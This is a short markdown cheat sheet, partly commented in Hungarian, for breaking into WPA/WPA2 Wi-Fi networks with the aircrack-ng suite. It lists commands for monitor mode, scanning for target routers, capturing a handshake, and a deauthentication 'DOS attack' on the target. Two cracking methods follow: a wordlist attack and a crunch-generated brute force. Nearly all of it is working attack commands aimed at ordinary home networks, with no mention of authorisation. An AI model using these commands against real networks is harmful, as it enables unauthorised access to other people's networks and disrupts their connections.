# SHOW WLANS

	iwconfig

# START AIRMON MODE
# Megszakad a wifi kapcsolat, ha volt, elkezdünk monitorozni...
# 

### START

```
sudo airmon-ng start wlp6s0
```

### STOP

sudo airmon-ng stop wlp6s0mon


# MONITORING:

### Show: wlp6s0mon or your network interface...

	iwconfig

### Search Target mac adresses, pl: AA:BB:CC:DD:EE:FF

	sudo airodump-ng wlp6s0mon

# RESULT OF MONITORING:
# Choose your target
	 CH 14 ][ Elapsed: 54 s ][ 2020-08-12 19:18 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -44       61      161    6  11  130        CCMP   PSK  Morfyum-m
 12:12:12:12:12:12  -44       61        3    0  11  130   OPN              WellHello
 33:33:33:33:33:33  -82       61        0    0   6  130   WPA2 CCMP   MGT  UPC Wi-Fr
 34:34:34:34:34:34  -81       55        7    0   6  130   WPA2 CCMP   PSK  UPC453905
 77:77:77:77:77:77  -85       25        0    0   6  270        CCMP   PSK  Telekom-0
 99:99:99:99:99:99  -88       18        0    0   1  130        CCMP   PSK  Telekom-W

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 AA:BB:CC:DD:EE:FF  EC:EC:EC:EC:EC:EC  -29    0 -24     19        5                  
 12:12:12:12:12:12  50:50:50:50:50:50  -46    0 - 0e     0        6                  
 33:33:33:33:33:33  22:22:22:22:22:22  -70    0e- 0e     0      440                  
 77:77:77:77:77:77  E8:E8:E8:E8:E8:E8   -1    1e- 0      0        1             


# TYPE YOUR TARGET BSSID, Channel (CH), and the capture file
## monitoring the router for a long time

```
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w ./test wlp6s0mon
```

# DOS ATTACK YOUR TARGET WIFI NETWORK

```
sudo aireplay-ng -0 4 -a AA:BB:CC:DD:EE:FF wlp6s0mon
```

# TWO PATH TO CRACK WIFI 

## 1. Is use a word file and attack wifi by .cap file
	# ADD WORDLIST AND TRY TO AUTHENTICATE

```
	sudo aircrack-ng ./test-01.cap -w ./wordlists/wordlist.txt
```

	# Tipikus hibaüzenet: 
	# Ez azért van, mert nem sikerült kellő adatot rögzíteni a .cap fájlba
	Packets contained no EAPOL data; unable to process this AP.

## 2. Use BSSID (mac) and STATION (mac) address, and give combination of letters and number

```
crunch 8 8 qwertzuiopasdfghjklyxcvbnm123456789 | aircrack-ng -w - ./test-01.cap --bssid AA:BB:CC:DD:EE:FF
```
